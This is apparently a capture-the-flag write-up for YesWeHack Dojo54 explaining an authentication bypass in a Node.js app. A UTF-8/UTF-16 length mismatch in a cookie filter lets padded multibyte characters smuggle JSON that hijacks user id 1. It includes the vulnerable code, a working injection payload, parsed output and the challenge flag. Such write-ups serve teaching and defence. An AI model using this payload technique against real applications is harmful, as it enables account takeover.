# YesWeHack Dojo54 HighScore Write UP

<p align="justify">The target app is a javascript web application which contains an authentication Bypass via UTF-16/UTF-8 Length Confusion. Below is a description of how the application behaves, the source code is attached to repository: </p>

- **Cookie Parsing (parseCookie)**: Extracts an id and a session string from a raw input format separated by a colon (:). It validates that the session string contains only alphabetic characters (letters and extended byte ranges) before wrapping it into a nested JSON structure.

- **Database Query (Users.findOne)**: Passes the parsed session object directly into a Sequelize where clause (where: cookie["session"]). This pattern is often vulnerable to object or operator injection in specific Node.js ORM contexts.

- **Validation**: If a database record is found and its session value matches the secret flag, the application exposes the flag and renders it using an EJS template (views/index.ejs).

## Exploitation

<p align="justify">The exploitation only requires 1 step which consists in filter bypass coupled to input injection in order to high jack Brumens session. The challenge is running over nodejs an take user input (which serves as a cookie) to authenticate user's session. The input is built the following way:</p>


````text
<int> ID : <string> session 
````

<p align="justify"> The user input is submitted through a POST request and goes through a filter function for sanity check. Below is the function used to parse user input:</p>

````javascript
function parseCookie(raw) {
  const sep = raw.indexOf(':');
  const id = Number(raw.slice(0, sep));
  const session = raw.slice(sep + 1);

  const bytes = Buffer.from(session, 'utf8');
  for (let i = 0; i < session.length; i++) {
    const b = bytes[i];
    const isLetter = (b>=0x41&&b<=0x5a)||(b>=0x61&&b<=0x7a)||b>=0x80;
    if (!isLetter) throw new Error('invalid game session');
  }

  return JSON.parse(`{"id":${id}, "session":{"session":"${session}"}}`);
}
````

<p align="justify">This function splits user input and extracts id value and session value. Then the id is casted to a javascript number and the session string is sanity checked using hex comparison. Only letters (ASCII) are allowed by the regex which converts each session byte into utf8. The vulnerability lies in the way the regex is used on session chars. Indeed, the loop iterates over session string length whereas buffer can contain more bytes than session string length because of confusion between UTF16 and UTF8 while encoding. For instance let's consider at following strings : </p>


````bash
 axel@linux-axel:~$ echo -n 'áááááááááááááááááááááááááááááááááááá' | wc -c
72
## 36 UTF-16 chars = 72 bytes in UTF-8 <=> session.length = 36 and bytes.length=72
````

<p align="justify">Because the session is 36 chars long and bytes buffer is 72 bytes long, each multibyte padding character consumes 1 unit of the loop counter but contributes 2 bytes to the buffer, creating a growing byte offset unchecked by the validation loop. Which means that for N padding characters, N unchecked bytes become available for injection.</p>

## PoC
<p align="justify">Once the confusion between UTF8 and UTF16 is understood, it can be used to inject session payload to gain access to Brumens's account. Because the account was written first into sqlite database and because the session in db is retrieved using following syntax, it's possible to inject id into session string: </p>

````javascript
 const record = await Users.findOne({
      where: cookie["session"],
    });
````

<p align="justify">The following payload can ba used to inject session string:</p>

````txt
0:áááááááááááááááááááááááááááááááááááá"},"session":{"id":1},"zzz":{"pad":"
````

<p align="justify">Because input is parsed into a JSON object, it yields at following parsing (on a virtualized server replicating server behavior): </p>

````bash
***
 Server on http://localhost:3000
[+]cookie parsed:
{ id: 0, session: { id: 1 }, zzz: { pad: '' } }
[+]session parsed:
{ id: 1 }
````

<p align="justify">  And because Brumens account is the first one written in db (with auto increment), it receives the id 1. It means the session injected string 'id:1' is used to retrieve db account, namely the one containing the following flag: </p>

```txt
FLAG{N3w_L3v3l_Unl0cked}
````


